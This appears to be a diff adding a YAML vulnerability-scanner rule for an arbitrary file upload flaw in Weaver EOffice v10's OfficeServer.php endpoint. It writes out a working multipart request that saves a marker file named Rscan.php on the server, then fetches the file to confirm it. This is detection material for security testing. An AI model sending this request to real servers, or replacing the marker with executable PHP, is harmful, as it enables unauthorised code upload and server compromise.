@@ -1,0 +1,19 @@
+name: 泛微-EOffice-v10-OfficeServer-文件上传
+description: >
+  文件上传
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /eoffice10/server/public/iWebOffice2015/OfficeServer.php
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs
+    body: "------WebKitFormBoundaryJjb5ZAJOOXO7fwjs\r\nContent-Disposition: form-data; name=\"FileData\"; filename=\"123.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nRscan_test\r\n------WebKitFormBoundaryJjb5ZAJOOXO7fwjs\r\nContent-Disposition: form-data; name=\"FormData\"\r\n\r\n{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'Rscan.php'}\r\n------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--"
+    expression:
+      status: 200
+  - method: GET
+    path: /eoffice10/server/public/iWebOffice2015/Document/Rscan.php   
+    expression:
+      status: 200
+      body_all:
+        - "Rscan_test"
